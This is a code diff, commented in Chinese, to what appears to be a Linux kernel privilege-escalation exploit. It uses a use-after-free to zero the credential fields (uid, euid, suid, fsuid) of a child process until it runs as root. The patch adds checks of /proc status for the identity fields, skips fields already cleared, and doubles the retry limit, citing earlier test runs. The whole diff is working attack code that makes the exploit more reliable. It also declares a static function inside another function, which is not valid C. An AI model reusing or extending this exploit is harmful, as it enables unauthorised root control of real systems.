@@ -1867,7 +1867,7 @@ static void log_proc_uid(pid_t pid)
 	fclose(file);
 }
 
-static int ask_child(unsigned *uid, unsigned *euid)
+static int ask_child(unsigned *uid, unsigned *euid, unsigned *gid, unsigned *egid)
 {
 	char buf[80];
 	struct pollfd pfd;
@@ -1912,7 +1912,8 @@ static int ask_child(unsigned *uid, unsigned *euid)
 	}
 	buf[n > 0 ? n : 0] = 0;
 	dprintf(STDOUT_FILENO, "[cred] answer %s", buf);
-	if (sscanf(buf, "uid=%u euid=%u", uid, euid) == 2)
+	/* 2.0.39：四元组全解析（gid/egid 可缺省，兼容旧日志） */
+	if (sscanf(buf, "uid=%u euid=%u gid=%u egid=%u", uid, euid, gid, egid) >= 2)
 		return 0;
 	return -1;
 }
@@ -2309,19 +2310,64 @@ int uaf_plant_main(int argc, char **argv)
 	 * req=176/alloc=192，BTF 实测）。usage@0 不触碰，对象保持有效。
 	 * 写目标是活对象的非指针字段，即使目标抓错也不会踩野指针。
 	 */
+	/* 2.0.39：/proc/<pid>/status 的 Uid:/Gid: 行给全部四个身份字段
+	 * （real/effective/saved/fs），无需 child 配合即可验证任何字段对。
+	 * uids[0..3]=uid/euid/suid/fsuid，gids[0..3]=gid/egid/sgid/fsgid。 */
+	static int read_child_ids(unsigned uids[4], unsigned gids[4])
+	{
+		char path[64], line[160];
+		FILE *file;
+		int have_u = 0, have_g = 0;
+		snprintf(path, sizeof(path), "/proc/%d/status", (int)g_cred_child_pid);
+		file = fopen(path, "r");
+		if (!file)
+			return -1;
+		while (fgets(line, sizeof(line), file)) {
+			if (!have_u && !strncmp(line, "Uid:", 4))
+				have_u = sscanf(line + 4, "%u %u %u %u",
+					&uids[0], &uids[1], &uids[2], &uids[3]) == 4;
+			else if (!have_g && !strncmp(line, "Gid:", 4))
+				have_g = sscanf(line + 4, "%u %u %u %u",
+					&gids[0], &gids[1], &gids[2], &gids[3]) == 4;
+		}
+		fclose(file);
+		return have_u && have_g ? 0 : -1;
+	}
+
 	int rooted = 0;
+	/* 2.0.39：字段感知重试。第 16 次实测暴露两个浪费：① uid/gid 早在第 3
+	 * 轮就清零（EPERM 已触发），但旧循环每轮仍固定花一个周期重清它；
+	 * ② 上限 12 不够覆盖 euid 的随机命中方差（第 14 次第 10 个 euid 周期
+	 * 才命中，第 16 次 9 个全未中）。改为：/proc 四元组确认已清零的字段
+	 * 跳过，把周期集中到剩余字段，上限提到 24。 */
 	const int cred_field_off[4] = { 4, 12, 20, 28 };
 	const char *cred_field_name[4] = { "uid/gid", "euid/egid", "suid/sgid", "fsuid/fsgid" };
-	for (int attempt = 1; attempt <= 12 && !rooted; attempt++) {
-		unsigned uid = 1, euid = 1;
-		dprintf(STDOUT_FILENO, "[cred] clear attempt %d/12 cred=%#" PRIx64 "\n",
+	int field_done[4] = { 0, 0, 0, 0 };
+	for (int attempt = 1; attempt <= 24 && !rooted; attempt++) {
+		unsigned uid = 1, euid = 1, cgid = 1, cegid = 1;
+		unsigned uids[4], gids[4];
+		int have_ids;
+		dprintf(STDOUT_FILENO, "[cred] clear attempt %d/24 cred=%#" PRIx64 "\n",
 			attempt, g_cred_kva);
 		if (!g_cred_kva) {
 			dprintf(STDOUT_FILENO, "[cred] no cred object leaked, abort\n");
 			break;
 		}
+		/* /proc 全字段核对：已归零的字段对本轮跳过 */
+		have_ids = read_child_ids(uids, gids) == 0;
+		if (have_ids) {
+			field_done[0] |= uids[0] == 0 && gids[0] == 0;
+			field_done[1] |= uids[1] == 0 && gids[1] == 0;
+			field_done[2] |= uids[2] == 0 && gids[2] == 0;
+			field_done[3] |= uids[3] == 0 && gids[3] == 0;
+		}
 		int all_ok = 1;
 		for (int k = 0; k < 4; k++) {
+			if (field_done[k]) {
+				dprintf(STDOUT_FILENO, "[cred] %s already zero, skip\n",
+					cred_field_name[k]);
+				continue;
+			}
 			dprintf(STDOUT_FILENO, "[cred] zero %s @ %#" PRIx64 "\n",
 				cred_field_name[k], g_cred_kva + cred_field_off[k]);
 			if (one_uaf(g_cred_kva + cred_field_off[k])) {
@@ -2335,13 +2381,21 @@ int uaf_plant_main(int argc, char **argv)
 			dprintf(STDOUT_FILENO, "[cred] field clear incomplete, retry\n");
 			continue;
 		}
-		dprintf(STDOUT_FILENO, "[cred] fields cleared, verifying\n");
-		if (ask_child(&uid, &euid) == 0 && uid == 0 && euid == 0)
+		if (have_ids && uids[0] == 0 && uids[1] == 0) {
+			/* getuid/geteuid 全零 = 终局条件达成 */
 			rooted = 1;
-		else if (uid == 1 && euid == 1)
-			dprintf(STDOUT_FILENO, "[cred] child did not answer\n");
-		else
+			continue;
+		}
+		dprintf(STDOUT_FILENO, "[cred] fields cleared, verifying\n");
+		if (ask_child(&uid, &euid, &cgid, &cegid) == 0) {
+			if (uid == 0 && euid == 0) {
+				rooted = 1;
+				continue;
+			}
 			dprintf(STDOUT_FILENO, "[cred] still uid=%u euid=%u\n", uid, euid);
+		} else {
+			dprintf(STDOUT_FILENO, "[cred] child did not answer\n");
+		}
 	}
 	if (!rooted) {
 		dprintf(STDOUT_FILENO, "[uaf] missed page; holding zombie\n");
